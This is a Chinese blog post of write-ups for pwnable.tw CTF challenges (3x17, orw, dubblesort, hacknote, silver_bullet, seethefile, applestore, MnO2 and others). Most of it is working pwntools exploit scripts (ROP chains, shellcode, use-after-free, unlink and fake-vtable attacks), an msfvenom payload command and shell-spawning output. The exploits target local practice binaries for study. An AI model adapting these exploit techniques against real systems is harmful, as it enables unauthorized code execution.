---
title: "pwnableByLdz"
draft: false
summary: ""
tags: ["life"]
---



pwnable是5年前的老题了，虽然和现在得题有一些区别但还是有很多可以学习的地方。

<!--more-->

<img src="../images/my-banner/banner1.png" alt="image-20250806191453291" style="zoom:200%;" />



### 3x17

由于扣了符号表，需要***利用ida pro的flare功能识别静态链接函数签名***

***csu(C_Start_Up)_fini***的执行顺序是.fini.array[n]-->.fini.array[n-1]-...->.fini.array[1]-->.fini.array[0]

##### 由于题目fini.aray只有两项，故可以改.fini.array为main和__libc_csu_fini实现循环，再通过栈迁移打ROP。

```
from pwn import *
io = process('./3x17')
context.arch='amd64'

def write(addr,data):
    io.sendafter(b'addr:',str(addr))
    io.sendafter(b'data:',data)
pop_rsi_ret = 0x406c30
pop_rdi_ret = 0x401696 
pop_rdx_ret = 0x446e35 
pop_rax_ret = 0x41e4af
write(0x4b40f0,p64(0x402960)+p64(0x401b6d))
ret = 0x401c4b
m_addr = 0x4b4100
binsh = b'/bin/sh\x00'.ljust(8,b'\x00')
write(0x4b4160,binsh)
payload0 = p64(pop_rdi_ret)
syscall = 0x4022b4
payload1 = p64(0x4b4160) + p64(pop_rsi_ret) + p64(0)
payload2 = p64(pop_rdx_ret) + p64(0) + p64(pop_rax_ret)
payload3 = p64(59) + p64(syscall)
write(0x4b4100,payload0)
write(0x4b4108,payload1)
write(0x4b4120,payload2)
write(0x4b4138,payload3)
gdb.attach(io)
write(0x4b40f0,p64(ret))
io.interactive()
```

<img src="C:\Users\0629\AppData\Roaming\Typora\typora-user-images\image-20250411095820460.png" alt="image-20250411095820460" style="zoom:67%;" />

### ORW

看到沙箱配置

```
┌──(kali㉿kali)-[~/Desktop/pwn/pwnable]
└─$ seccomp-tools dump ./orw
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW                                                                          
┌──(kali㉿kali)-[~/Desktop/pwn/pwnable]
└─$ file orw 
orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
```

##### ***由于官方给的文件本地bss段没有执行权限，遂止***，远程应该有权限，所以贴出我的exp。

```
from pwn import *
io = process('./orw')
context.arch = 'i386'
addr = 0x804a100
sc = shellcraft.open("./flag")
sc += shellcraft.read(3,addr,0x30)
sc += shellcraft.write(1,addr,0x30)
shellcode = '''
        xor esi,esi
        push 0x804a110
        pop edi
        push 0x5
        pop eax
        int 0x80
        push 0x804a120
        pop esi
        push 20
        pop edx
        push 0x3
        pop eax
        int 0x80
        push 1
        pop edi
        push 0x4
        pop eax
        int 0x80
'''
print(len(asm(sc)))
gdb.attach(io)
io.send(asm(sc))
io.interactive()
```

### calc



### dubble sort*

很麻烦的栈题，由于未对输入长度作限制我们可以打溢出，但是需要考虑三件事，如何泄露libc地址、如何绕过canary、如何不被dubblesort将我们的输入排乱。

**如何泄露libc地址**：由于read不增加\x00，通过printf函数我们可以泄露一个libc内地址

**如何绕过canary**：输入__isoc99_scanf("%u", v4);不能解析的字符会导致缓冲区卡住之后的数据无法输入，而当输入为’+’ ‘-‘这两个字符时，由于他们可以定义数字的正负，因此不会被定义为非法字符。同时单独输入该字符又能达到不往栈上写入数据的目的。

**如何不被dubblesort将我们的输入排乱**：我们可以在canary前输入0，canary后输入system和binsh，由于canary大于0小于&system，故其位置不会变动

```
┌──(kali㉿kali)-[~/Desktop/pwn/pwnable]
└─$ cat expdubb          
from pwn import *
io = process('./dubblesort')
context(os ='linux',arch='amd64')
libc = ELF('/lib/i386-linux-gnu/libc.so.6') 
io.send(b's'*0x14)
io.recvuntil(b's'*0x14)
libc_addr = u32(io.recv(4)) + 0xf7c7f000 - 0xf7ed9570
print(hex(libc_addr))
io.sendlineafter(b'sort :',b'35') #or 33
sys = libc.symbols['system'] + libc_addr
binsh = next(libc.search(b'/bin/sh\x00')) + libc_addr
for i in range(24):
        io.sendlineafter(b'number : ','0')
io.sendlineafter(b'number : ',b'+')
for i in range(8):
        io.sendlineafter(b'number : ',str(sys))
for i in range(2):
        io.sendlineafter(b'number : ',str(binsh))
gdb.attach(io)
io.interactive()
```

```
[*] running in new terminal: ['/usr/bin/gdb', '-q', './dubblesort', '-p', '3495']
[+] Waiting for debugger: Done
[*] Switching to interactive mode
Processing......
Result :
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 2724921856 4158137536 4158137536 4158137536 4158137536 4158137536 4158137536 4158137536 4158137536 4159675964 4159675964 $                                                                                             l                                                                                                                                   ls                                                                                                                                  ls
2.23-0ubuntu3_i386   death_note  expdn        expr          orw
2.29-0ubuntu2_amd64  dubblesort  expdub       expr1         pat
3x17                 exp         expdubb      flag          re-alloc
applestore           exp3x17     expdubb~     hacknote      script.py
babystack            expapp      exphacknote  libc_32.so.6  silver_bullet
calc                 expcalc     exporw       libc_64.so.6  test
$ 
```

### Hacknote

这题和ctf-wiki的某一题很像，但是不同点是它没有magic函数，需要我们自行放入system(/bin/sh);经笔者测试，本地打不通，可以执行到execve但是无法解析。

##### 由于glibc-all-in-one里没有提供的库，笔者只能选择一个版本相近的libc库，也许是笔者用的库的原因，亦或者一些其他的原因，而笔者无法注册pwnable.tw所以远程也运行不了，但笔者坚信自己的exp绝对没问题。

delete函数存在明显的uaf漏洞，这题第一个想到的是修改printnote函数然后通过print执行其，就需要我们想办法uaf让可以写到add每次申请到的第一个堆块

给出exp

```
┌──(kali㉿kali)-[~/Desktop/pwn/pwnable]
└─$ cat exp     
from pwn import *
io = process('./hacknote')
elf = ELF('hacknote')
libc = ELF('2.23-0ubuntu3_i386/libc.so.6')
context(arch = 'i386',log_level='debug')
def cho(i):
        io.sendafter(b'Your choice :',str(i).encode())
def add(size,con):
        cho(1)
        io.sendafter(b'Note size :',str(size).encode())
        io.sendafter(b'Content :',con)
def dele(idx):
        cho(2)
        io.sendafter(b'Index :',str(idx).encode())
def show(idx):
        cho(3)
        io.sendafter(b'Index :',str(idx).encode())
def exit():
        cho(4)
add(0x8,b'a')#0
add(0x8,b'b')#1

dele(0)
dele(0)
add(0x18,b'b') #2 //这里就会错位，这样我们在申请到的管理堆块是其他堆块的内容堆块，而内容堆块是其他堆块的管理堆块
add(0x8,p32(0x804862b)+p32(0x804A024)) #3

show(0)
libc_addr = u32(io.recv(4)) + 0xf7e12000 - 0xf7e71b80
print(hex(libc_addr))
dele(3)
malloc_hook = 0xf7f4d768 - 0xf7d9b000+libc_addr
free_hook = 0xf7f358b0 - 0xf7d82000 +libc_addr
system = libc_addr + libc.symbols['system'] 
binsh = libc_addr + next(libc.search(b"/bin/sh\x00"))
add(0x8,p32(system)+p32(binsh))

#add(0x8,p32(0x804862b)+p32(malloc_hook))
#dele(0) //这里尝试分配malloc_hook和free_hook，皆以失败告终

show(0)
io.interactive()
```

经过我的gdb调试发现其虽然执行到sh但是被一串奇怪的乱码给阻塞了

```
pwndbg> n
0xf7e07c74 in ?? () from ./2.23-0ubuntu3_i386/libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
 EAX  0xf7f28a3f ◂— das  /* '/bin/sh' */
 EBX  0xf7f7f000 ◂— 0x1b1db0
 ECX  0xff8df194 ◂— 0
 EDX  0
 EDI  0xff8df170 ◂— 0
 ESI  0xf7f7f000 ◂— 0x1b1db0
 EBP  0xff8df214 ◂— 1
*ESP  0xff8df150 —▸ 0xf7f28a3f ◂— das  /* '/bin/sh' */
*EIP  0xf7e07c74 ◂— call execve
───────────────────────[ DISASM / i386 / set emulate on ]───────────────────────
   0xf7e07c66    push   dword ptr [eax]
   0xf7e07c68    lea    eax, [esp + 0x2c]               EAX => 0xff8df184 —▸ 0xf7f28a44 ◂— jae 0xf7f28aae /* 'sh' */
   0xf7e07c6c    push   eax
   0xf7e07c6d    lea    eax, [esi - 0x565c1]            EAX => 0xf7f28a3f ◂— das  /* '/bin/sh' */
   0xf7e07c73    push   eax
 ► 0xf7e07c74    call   execve                      <execve>
        path: 0xf7f28a3f ◂— '/bin/sh'
        argv: 0xff8df184 —▸ 0xf7f28a44 ◂— 0x65006873 /* 'sh' */
        envp: 0xff8df3bc —▸ 0xff8e035c ◂— 'COLORFGBG=15;0'
 
   0xf7e07c79    mov    dword ptr [esp], 0x7f
   0xf7e07c80    call   _exit                       <_exit>
 
   0xf7e07c85    lea    esi, [esi]
   0xf7e07c89    lea    edi, [edi]
   0xf7e07c90    push   ebp
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp 0xff8df150 —▸ 0xf7f28a3f ◂— das  /* '/bin/sh' */
01:0004│-0c0 0xff8df154 —▸ 0xff8df184 —▸ 0xf7f28a44 ◂— jae 0xf7f28aae /* 'sh' */
02:0008│-0bc 0xff8df158 —▸ 0xff8df3bc —▸ 0xff8e035c ◂— 'COLORFGBG=15;0'
03:000c│-0b8 0xff8df15c —▸ 0xff8df170 ◂— 0
04:0010│-0b4 0xff8df160 ◂— 0
05:0014│-0b0 0xff8df164 ◂— 0
06:0018│-0ac 0xff8df168 —▸ 0xff8df194 ◂— 0
07:001c│-0a8 0xff8df16c —▸ 0x85ee008 —▸ 0xf7e07d80 (system) ◂— sub esp, 0xc
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► 0 0xf7e07c74 None
   1 0x804893f None
   2 0x8048a8a None
   3 0xf7de5637 __libc_start_main+247
   4 0x8048551 None
────────────────────────────────────────────────────────────────────────────────
pwndbg> n
process 26580 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Inferior 2 (process 26580) exited with code 0177]
最终的输出是：
[*] Switching to interactive mode
[DEBUG] Received 0x1b bytes:
    00000000  73 68 3a 20  31 3a 20 80  7d e0 f7 3f  8a f2 f7 3a  │sh: │1: ·│}··?│···:│
    00000010  20 6e 6f 74  20 66 6f 75  6e 64 0a                  │ not│ fou│nd·│
    0000001b
sh: 1: \x80}\xe0\xf7?\x8a\xf2\xf7: not found
```

### silver_bullet

ida反编译之后就发现不对劲，这个power函数有点多此一举为什么不是直接重写而要拼接，我判断这里面要么有逻辑错误要么有解析错误

<img src="..\images\image-20250412213545181.png" alt="image-20250412213545181" style="zoom: 75%;" />

<img src="..\images\image-20250412213920106.png" alt="image-20250412213920106" style="zoom:80%;" />

上面可以看到，我输入了一大堆结果长度变量依旧只是0x10，这是为什么呢？这是我的测试脚本

```
from pwn import *
io = process('./silver_bullet')
context(arch = 'i386',log_level = 'debug')
def cho(idx):
        io.sendafter(b'choice :',str(idx).encode())
def add(con):
        cho(1)
        io.sendlineafter(b'bullet :',con)
def power(con):
        cho(2)
        io.sendlineafter(b'bullet :',con)
def beat():
        cho(3)
add(b'a'*0x20)
gdb.attach(io)
power(b'a'*0x10)
io.interactive()
```

##### 聪明的我立马想到是read_input函数出现了**off-by-one**,把原本的*(dest+12)给盖了

```
int __cdecl power_up(char *dest)
{
  char s[48]; // [esp+0h] [ebp-34h] BYREF
  size_t v3; // [esp+30h] [ebp-4h]

  v3 = 0;
  memset(s, 0, sizeof(s));
  if ( !*dest )
    return puts("You need create the bullet first !");
  if ( *(dest + 12) > 47u )                     // vuln
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input(s, 0x30 - *(dest + 12));
  strncat(dest, s, 48 - *(dest + 12));          // vuln
  v3 = strlen(s) + *(dest + 12);
  printf("Your new power is : %u\n", v3);
  *(dest + 12) = v3;
  return puts("Enjoy it !");
}
```

接下来就是ret2libc那一套了，这里有个小插曲就是

```
pwndbg> plt
Section .plt 0x8048480-0x8048490:
No symbols found in section .plt
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/kali/Desktop/pwn/pwnable/silver_bullet:
GOT protection: Full RELRO | Found 0 GOT entries passing the filter
```

我们可以

```
pwndbg>got -r
```

至于plt表只能手动去ida里找

```
.plt.got:08048490 _plt_got        segment qword public 'CODE' use32
.plt.got:08048490                 assume cs:_plt_got
.plt.got:08048490                 ;org 8048490h
.plt.got:08048490                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.plt.got:08048490 ; [00000006 BYTES: COLLAPSED FUNCTION read]
.plt.got:08048496                 align 4
.plt.got:08048498 ; [00000006 BYTES: COLLAPSED FUNCTION printf]
.plt.got:0804849E                 align 10h
.plt.got:080484A0 ; [00000006 BYTES: COLLAPSED FUNCTION usleep]
.plt.got:080484A6                 align 4
.plt.got:080484A8 ; [00000006 BYTES: COLLAPSED FUNCTION puts]
.plt.got:080484AE                 align 10h
.plt.got:080484B0 ; [00000006 BYTES: COLLAPSED FUNCTION __gmon_start__]
.plt.got:080484B6                 align 4
.plt.got:080484B8 ; [00000006 BYTES: COLLAPSED FUNCTION exit]
.plt.got:080484BE                 align 10h
.plt.got:080484C0 ; [00000006 BYTES: COLLAPSED FUNCTION strlen]
.plt.got:080484C6                 align 4
.plt.got:080484C8 ; [00000006 BYTES: COLLAPSED FUNCTION __libc_start_main]
.plt.got:080484CE                 align 10h
.plt.got:080484D0 ; [00000006 BYTES: COLLAPSED FUNCTION setvbuf]
.plt.got:080484D6                 align 4
.plt.got:080484D8 ; [00000006 BYTES: COLLAPSED FUNCTION memset]
.plt.got:080484DE                 align 10h
.plt.got:080484E0
```

给出exp

```
┌──(kali㉿kali)-[~/Desktop/pwn/pwnable]
└─$ cat exp
from pwn import *
io = process('./silver_bullet')
libc = ELF('2.23-0ubuntu3_i386/libc-2.23.so')
context(arch = 'i386')
def cho(idx):
        io.sendafter(b'choice :',str(idx).encode())
def add(con):
        cho(1)
        io.sendlineafter(b'bullet :',con)
def power(con):
        cho(2)
        io.sendlineafter(b'bullet :',con)
def beat():
        cho(3)
main = 0x8048954
#puts_plt = 
puts_got = 0x804afdc
call_puts = 0x804871b
puts1 = 0x80484a8
add(b'a'*0x20)
power(b'a'*0x10)
print(hex(call_puts))
power(b'\xff'*0x7+p32(puts1)+ p32(main) +p32(puts_got))
gdb.attach(io)
beat()
io.recvuntil(b'!!\x0a')
libc_addr = u32(io.recvuntil(b'\x0a',drop=True).ljust(4,b'\x00')) - libc.symbols['puts']
print(hex(libc_addr))
sys = libc_addr + libc.symbols['system']
binsh = libc_addr + next(libc.search(b"/bin/sh\x00"))
add(b'a'*0x20)
power(b'a'*0x10)
power(b'\xff'*0x7+p32(sys)+ p32(main) +p32(binsh))
beat()
io.interactive()
                                                                                                             
┌──(kali㉿kali)-[~/Desktop/pwn/pwnable]
└─$ python3 exp
[+] Starting local process './silver_bullet': pid 25817
[*] '/home/kali/Desktop/pwn/pwnable/2.23-0ubuntu3_i386/libc-2.23.so'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
0x804871b
[*] running in new terminal: ['/usr/bin/gdb', '-q', './silver_bullet', '-p', '25817']
[+] Waiting for debugger: Done
0xf7db6000
[*] Switching to interactive mode
>----------- Werewolf -----------<
 + NAME : Gin
 + HP : 2147483647
>--------------------------------<
Try to beat it .....
Oh ! You win !!
$ ls
2.23-0ubuntu3_i386  dubblesort  expcalc  exporw    libc_32.so.6  silver_bullet
3x17                exp         expdub   flag      orw
calc                exp3x17     expdubb  hacknote  script.py
```

### seethefile

程序可以实现任意读，但是唯独对flag文件做出了限制。

##### 古早的IO_File打法，劫持对应的vtable即可。

这里补充一下我之前忘记的知识点：

**伪文件系统：**在 Linux 系统中，/proc/self/ 是一个特殊的伪文件系统目录，指向当前进程的 /proc 信息。它包含了大量与当前进程相关的文件和子目录，用于提供进程的运行时状态、配置和资源使用情况。

```
常见子目录
    maps/：题目中使用，可以读取内存的映射关系。
    fd/：如上所述，列出文件描述符。
    fdinfo/：文件描述符的详细信息。
    net/：网络相关信息。
    task/：每个线程的详细信息，结构类似 /proc/self/，但针对特定线程。
    mem/：进程的虚拟内存内容，可用于直接读写进程内存（需权限）。
```

那么做法就是读取/proc/self/maps文件，接着由于scanf没限制长度可以无限往bss溢出，因此：

1、_flags&0x2000为0就会直接调用_IO_FINSH(fp),_IO_FINSH(fp)相当于调用fp->vtable->_finish(fp)
2、将fp指向一块内存p,p的前4个字节设置为0xffffdfff,p偏移4的位置放上参数';/bin/sh'(字符要以;开头)；p偏移sizeof(_IO_FILE)大小位置(vtable)覆盖为内存q,q的2*4字节处(vtable->_finish)覆盖为system即可
3、vtable是个虚标指针，里面一般性是21or23个变量，我们需要改的是第三个，别的填充些正常的地址就好

```
┌──(kali㉿kali)-[~/Desktop/pwn/pwnable]
└─$ python3 exp
[+] Starting local process './seethefile': pid 23631
[*] '/home/kali/Desktop/pwn/pwnable/2.23-0ubuntu3_i386/libc.so.6'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[*] leak_addr
0xf7df2000
[*] IO_File
[*] Switching to interactive mode
Thank you aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\xb2\x04\x08 ,see you next time
sh: 1: \xff\xdf\xff\xff: not found
$ ls
2.23-0ubuntu3_i386   exp           pat        seethefile
2.29-0ubuntu2_amd64  libc_64.so.6  script.py  test
$ 
[*] Interrupted
[*] Stopped process './seethefile' (pid 23631)                                                                                                                  
┌──(kali㉿kali)-[~/Desktop/pwn/pwnable]
└─$ cat exp
from pwn import *
io = process('./seethefile')
context(os='linux',arch='i386')
libc = ELF('2.23-0ubuntu3_i386/libc.so.6')

def open(filename):
        io.sendlineafter(b'Your choice :',b'1')
        io.sendlineafter(b'What do you want to see :',str(filename).encode())
def read():
        io.sendlineafter(b'Your choice :',b'2')
def write():
        io.sendlineafter(b'Your choice :',b'3')
def close():
        io.sendlineafter(b'Your choice :',b'4')

log.info("leak_addr")
open('/proc/self/maps')
read()
write()
read()
write()
io.recvuntil(b'heap]\n')
libc_a = int(io.recv(8),16)
print(hex(libc_a))

system = libc_a + libc.symbols['system']
log.info("IO_File")
fake_io = b'a'*0x20
fake_io += p32(0x804b290)
fake_io += p32(0)*3
io_file = p32(0xffffdfff) + b';/bin/sh'
io_file = io_file.ljust(0x94,b'\x00')
fake_io += io_file
fake_io += p32(0x804b330) + p32(0)*2
fake_io += p32(system)*3

io.sendlineafter(b'Your choice :',b'5')
io.sendlineafter(b'Leave your name :',fake_io)
io.interactive()
```



### applestore

这个题目通过维护一个链表来实现一个“购物车”的逻辑，暂时没有找到它的漏洞，经过我的测试，当我们进行一次add操作之后就会出现下面这个诡异的情况。反向思考的话这个题目我们唯一的输入就是通过my_read函数，但长度都是固定的都没有溢出。

```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x804c000
Size: 0x408 (with flag bits: 0x409)

Allocated chunk | PREV_INUSE
Addr: 0x804c408
Size: 0x18 (with flag bits: 0x19)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x804c420
Size: 0x68 (with flag bits: 0x69)
fd: 0xf7fcd7b0
bk: 0xf7fcd7b0

Allocated chunk
Addr: 0x804c488
Size: 0x10 (with flag bits: 0x10)
```

##### 突然发现一个不同的地方，那就是checkout函数这里添加链表的操作与之前调用create不同，它将链表区块分配在栈上。

经过测试，添加的iphone8位于stack上[ebp-0x20],而cart、delete这种函数我们输入的位置位于[ebp-0x22]，因此可以我们覆盖对应的地址。另外地，delete函数让我想到了unlink，我们既然能够覆盖链表区块就能通过delete函数实现任意地址写。

```
unsigned int checkout()
{
  int v1; // [esp+10h] [ebp-28h]
  char *v2[5]; // [esp+18h] [ebp-20h] BYREF
  unsigned int v3; // [esp+2Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  v1 = cart();
  if ( v1 == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf(v2, "%s", "iPhone 8");
    v2[1] = 1;
    insert(v2);
    v1 = 0x1C07;
  }
  printf("Total: $%d\n", v1);
  puts("Want to checkout? Maybe next time!");
  return __readgsdword(0x14u) ^ v3;
}
```

所以我们可以先泄露地址然后迁移ebp打unlink改atoi为onegadget直接getshell

```
┌──(kali㉿kali)-[~/Desktop/pwn/pwnable]
└─$ cat expapp     
from pwn import *
io = process('./applestore')
context(arch='i386')
libc = ELF('2.23-0ubuntu3_i386/libc.so.6')
def add(idx):
        io.sendafter(b'> ',b'2')
        io.sendafter(b'Device Number> ',str(idx).encode())
def dele(idx):
        io.sendafter(b'> ',b'3')
        io.sendafter(b'Number> ',idx)
def checkout(cho):
        io.sendafter(b'> ',b'5')
        io.sendafter(b'(y/n) > ',cho)
def cart(cho):
        io.sendafter(b'> ',b'4')
        io.sendafter(b'(y/n) > ',cho)

for i in range(6):
        add(1)
for i in range(20):
        add(2)

checkout(b'y')
cart(b'y\x00'+p32(0x804b028)+p32(0)*3) #leak libc addr
io.recvuntil(b'27: ')
libc_addr = u32(io.recv(4))+0xf7e0b000-0xf7e6ab80
environ = 0xf7fbeddc - 0xf7e0b000 + libc_addr
print(hex(libc_addr))
dele(b'27')

checkout(b'n')
cart(b'y\x00'+p32(environ)+p32(0)*3) #leak stack addr
io.recvuntil(b'27: ')
stack_addr = u32(io.recv(4))+0xff8cc6c8-0xff8cc7cc
print(hex(stack_addr))


atoi_got = 0x804B040
one = libc_addr + 0x3ac3c
print(hex(one))
dele(b'27'+p32(0)*2+p32(atoi_got+0x22)+p32(stack_addr-8))
io.sendafter(b'> ',p32(one))

io.interactive()
┌──(kali㉿kali)-[~/Desktop/pwn/pwnable]
└─$ python3 expapp       
[+] Starting local process './applestore': pid 45663
[*] '/home/kali/Desktop/pwn/pwnable/2.23-0ubuntu3_i386/libc.so.6'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
0xf7e00000
0xff9f2528
0xf7e3ac3c
[*] Switching to interactive mode
$ ls
2.23-0ubuntu3_i386   expdubb
2.29-0ubuntu2_amd64  exphacknote
3x17                 exporw
applestore           flag
calc                 hacknote
core.44654           libc_32.so.6
dubblesort           libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so
exp                  orw
exp1                 pat
exp3x17              re-alloc
epapp               script.py
expcalc              silver_bullet
expdub
```

### re-alloc*

只允许创建一个堆块，但是缺少下界检查，一开始我想的是打stdout、IO file。但是IOfile的板子我只会一个apple2，于是去借鉴了以下a3博客里的打法：

##### realloc 时 size=0 等价于 free，构造double free任意地址写去改got表。

### Death_note

```
pwndbg> info register
eax            0x1                 1
ecx            0x6                 6
edx            0x804b1a0           134525344
ebx            0xf7fa1e14          -134603244
esp            0xffffcfd0          0xffffcfd0
ebp            0xffffd048          0xffffd048
esi            0x8048a30           134515248
edi            0xf7ffcb60          -134231200
eip            0x80487ef           0x80487ef <add_note+160>
eflags         0x296               [ PF AF SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
```

ecx是我们输入的长度，edx指向我们的shellcode。

https://shell-storm.org/online/Online-Assembler-and-Disassembler/

```
msfvenom -a x86 --platform linux -p linux/x86/exec CMD="sh" -e x86/alpha_mixed BufferRegister=EDX -f python
```

##### 没成功，没搞懂为什么。

### babystack

栈平衡，做法可以看这篇

https://github.com/0bs3rver/pwnable.tw/blob/main/babystack-strcpy%E6%A0%88%E6%BA%A2%E5%87%BA/babystack-WP.md

### MnO2

通过check函数检查输入的是否是一个*化合物*得形式，如果check成功则会跳转执行，考点也是***alphanumeric shellcode***

```
┌──(kali㉿kali)-[~/Desktop/pwn/pwnable]
└─$ python3 exp                                        
[+] Starting local process './mno2': pid 1745
[*] set read func
[*] make int0x80 Í in the last place
[*] running in new terminal: ['/usr/bin/gdb', '-q', './mno2', '-p', '1745']
[+] Waiting for debugger: Done
[*] Switching to interactive mode
$ ls
2.23-0ubuntu3_amd64  core.1892   core.29599  core.5328     mno2
2.23-0ubuntu3_i386   core.28108  core.29702  core.7460     pat
2.29-0ubuntu2_amd64  core.28400  core.30041  core.7725     script.py
caov                 core.28649  core.3027   exp           seethefile
core.10605           core.28984  core.3858   expsee        test
core.10706           core.29326  core.4586   libc_64.so.6
$ 
[*] Interrupted
[*] Stopped process './mno2' (pid 1745)
                                                                                                                          
┌──(kali㉿kali)-[~/Desktop/pwn/pwnable]
└─$ cat exp                                
from pwn import *
io = process('./mno2')
context(os='linux',arch='i386')
entry_state = '''
 EAX  0x324f6e4d ◂— inc ebx /* 0x43434343; 'CCCC' */
 EBX  0
 ECX  0
 EDX  0x804889d ◂— inc ebx /* 'C' */
 EDI  0xf7fcd000 ◂— 0x1b1db0
 ESI  0xf7fcd000 ◂— 0x1b1db0
 EBP  0xffffd098 ◂— 0
*ESP  0xffffd05c —▸ 0x80487ea (main+169) ◂— mov dword ptr [esp], 0
*EIP  0x324f6e4d ◂— inc ebx /* 0x43434343; 'CCCC' */
'''
read_state = '''
 EAX = 3
 EBX = 0
 ECX = buffer
 EDX = len
 ...
'''
allow = '''
H He Li Be B C N O F Ne Na Mg Al Si P S Cl Ar K Ca Sc Ti V Cr Mn Fe Co Ni Cu Zn Ga Ge As Se Br Kr Rb Sr Y Zr Nb Mo Tc Ru Rh Pd Ag Cd In Sn Sb Te I Xe Cs Ba La Ce Pr Nd Pm Sm Eu Gd Tb Dy Ho Er Tm Yb Lu Hf Ta W Re Os Ir Pt Au Hg Tl Pb Bi Po At Rn Fr Ra Ac Th Pa U Np Pu Am Cm Bk Cf Es Fm Md No Lr Rf Db Sg Bh Hs Mt Ds Rg Cn Fl Lv
'''
log.info('set read func')
shellcode = b'VTh0000' #push esi,push esp,push 0000
shellcode += b'YY' #pop ecx,pop ecx
shellcode += b'31' #xor    esi,DWORD PTR [ecx]
shellcode += b'FFF' #inc esi*3
shellcode += b'VXe' #push esi,pop eax
shellcode += b'N' #dec esi
#addr use Co
shellcode += b'ThCoO2' #push esp,push 0x324f6f43
shellcode += b'Y' #pop rcx

state = '''
 EAX  3
 EBX  0
*ECX  0x324f6f43 ◂— 0
 EDX  0x80488f8 ◂— pop ecx /* 'Y' */
 EDI  0xf7ee5000 ◂— 0x1b1db0
 ESI  2
 EBP  0xffb4efa8 ◂— 0
*ESP  0xffb4ef64 —▸ 0xffb4ef68 —▸ 0xf7ee5000 ◂— 0x1b1db0
*EIP  0x324f6e66 ◂— 0
───────────────────────[ DISASM / i386 / set emulate on ]───────────────────────
   0x324f6e5c    pop    eax                    EAX => 3
   0x324f6e5d    dec    esi                    ESI => 2
   0x324f6e5f    push   esp
   0x324f6e60    push   0x324f6f43
   0x324f6e65    pop    ecx                    ECX => 0x324f6f43
 ► 0x324f6e66    add    byte ptr [eax], al
   0x324f6e68    add    byte ptr [eax], al
   0x324f6e6a    add    byte ptr [eax], al
   0x324f6e6c    add    byte ptr [eax], al
   0x324f6e6e    add    byte ptr [eax], al
   0x324f6e70    add    byte ptr [eax], al
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp 0xffb4ef64 —▸ 0xffb4ef68 —▸ 0xf7ee5000 ◂— 0x1b1db0
01:0004│-040 0xffb4ef68 —▸ 0xf7ee5000 ◂— 0x1b1db0
02:0008│-03c 0xffb4ef6c —▸ 0x80487ea (main+169) ◂— mov dword ptr [esp], 0
03:000c│-038 0xffb4ef70 —▸ 0x324f6e66 ◂— 0
04:0010│-034 0xffb4ef74 ◂— 0
05:0014│-030 0xffb4ef78 ◂— 0x719a
06:0018│-02c 0xffb4ef7c ◂— 0x22 /* '"' */
07:001c│-028 0xffb4ef80 ◂— 0xffffffff
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► 0 0x324f6e66 None
   1 0xf7d4b637 __libc_start_main+247
   2 0x8048451 _start+33
────────────────────────────────────────────────────────────────────────────────
pwndbg> x/20x 0x324f6f43
0x324f6f43:     0x00000000      0x00000000      0x00000000      0x00000000
'''
log.info('make int0x80 \xcd\x80 in the last place') 
#use 19:xor    DWORD PTR [ecx],edi
#    11 xor    DWORD PTR [ecx],esi
#gdb.attach(io)
#0xcd = 1100 1101 ,wo use 1000 0000 ^ 1100 1101 = 0100 1101

shellcode += b'F'*0x4b #0xcd = 0x4b^0x80
shellcode += b'F'*0x33
shellcode += b'11' 
shellcode += b'I'*1  #dec ecx
shellcode += b'11'
shellcode += b'N'*0x33 #dec esi
shellcode += b'11'
shellcode += b'ThCoO2' #push esp,push 0x324f6f43
shellcode += b'Y' #pop rcx
shellcode += (0x42-0x25)*b'N'

io.sendline(shellcode)
gdb.attach(io)
sleep(1)
io.send(b'\x90'*3+asm(shellcraft.sh()))

io.interactive()
```

首先需要考虑如何让eax=3，rbx=buffer，rbx原本就等于0，这些都简单。

